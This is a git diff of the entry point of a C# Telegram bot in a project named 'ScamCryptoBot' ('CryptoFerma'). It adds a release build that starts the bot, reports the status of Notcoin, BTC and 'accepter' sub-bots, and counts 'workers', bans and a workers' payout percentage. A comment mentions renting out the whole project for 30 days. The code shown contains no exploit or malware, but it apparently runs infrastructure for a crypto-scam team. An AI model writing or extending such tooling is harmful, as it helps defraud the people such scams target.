@@ -3,7 +3,7 @@ using Telegram.Bot;
 using Telegram.Bot.Polling;
 using Telegram.Bot.Types.Enums;
 
-
+#if DEBUG
 namespace ScamCryptoBot
 {
     internal class MainClass
@@ -11,7 +11,7 @@ namespace ScamCryptoBot
         private static ITelegramBotClient telegramClient;
         private static ReceiverOptions receiverOptions;
 
-        private static string CryptoFermaVersion = " 1.1.4";
+        private static string CryptoFermaVersion = " 1.5";
 
         static async Task Main(string[] args)
         {
@@ -73,3 +73,76 @@ namespace ScamCryptoBot
         }
     }
 }
+#endif
+#if RELEASE
+namespace ScamCryptoBot
+{
+    internal class MainClass
+    {
+        private static ITelegramBotClient telegramClient;
+        private static ReceiverOptions receiverOptions;
+
+        private static string CryptoFermaVersion = " 1.1.4";
+
+        static async Task Main(string[] args)
+        {
+            LocalConfig.LoadFromConfigFile();
+            System.Timers.Timer timer = new System.Timers.Timer();
+            timer.Interval = 12 * 60 * 60 * 1000; // 12 часов в миллисекундах
+            timer.Elapsed += TimerElapsed;
+            timer.Start();
+
+
+
+            telegramClient = new TelegramBotClient(LocalConfig.maniToken);
+            receiverOptions = new ReceiverOptions
+            {
+                AllowedUpdates = new[]
+                {
+                    UpdateType.Message,
+                    UpdateType.CallbackQuery,
+                },
+                ThrowPendingUpdates = true,
+            };
+            // Обновляем значения статусов ботов
+            string notcoinBotStatus = LocalConfig.isNotcoinRun ? "Enabled" : "Disabled";
+            string btcBotStatus = LocalConfig.isBTCEnable ? "Enabled" : "Disabled";
+            string accepterBotStatus = LocalConfig.isAccepterEnable ? "Enabled" : "Disabled";
+            using var cts = new CancellationTokenSource();
+            telegramClient.StartReceiving(MainHandlers.UpdateHandler, MainHandlers.ErrorHandler, receiverOptions, cts.Token);
+            Console.Title = $"CryptoFerma: {CryptoFermaVersion}";
+            PrintColoredText($"[#] Check database.....", ConsoleColor.Cyan);
+            await DataBase.LoadFromDataBase();
+            int workersCount = DataBase.UserDataBase.Count;
+            int bansCount = DataBase.BanIDs.Count;
+            PrintColoredText($"[+] Bot sucsessuly startet at: {LocalConfig.maniToken}\n" +
+                $"[+] Version:{CryptoFermaVersion}\n" +
+                $"[#] Admin ID: {LocalConfig.adminMainId}\n" +
+                $"[#] Notcoin Bot status: {notcoinBotStatus}\n" +
+                $"[#] BTC Bot status: {btcBotStatus}\n" +
+                $"[#] Accepter bot status: {accepterBotStatus}\n" +
+                $"[#] Workers in DataBase: {workersCount}\n" +
+                $"[#] Ban users in DataBase: {bansCount}\n" +
+                $"[#] Workers percent: {LocalConfig.PercentOfWorkers}%\n" +
+                $"[#] Develop by AM0R3M10: https://t.me/WH3BABY\n", ConsoleColor.DarkMagenta);
+            await Task.Delay(TimeSpan.FromDays(30)); // В таком состоянии он будет вечно запущен , можно установить на автоматике кол-во дней 
+                                  // к примеру аренда всего проекта на 30 дней == await Task.Delay(TimeSpan.FromDays(30));
+
+
+
+        }
+        public static void PrintColoredText(string messge, ConsoleColor consoleColor)
+        {
+            Console.ForegroundColor = consoleColor;
+            Console.WriteLine(messge);
+            Console.ResetColor();
+        }
+        // DataBase BackUp after 12h works..
+        private static void TimerElapsed(object sender, ElapsedEventArgs e)
+        {
+            DataBase.DataBaseRecover().GetAwaiter().GetResult();
+        }
+    }
+}
+
+#endif
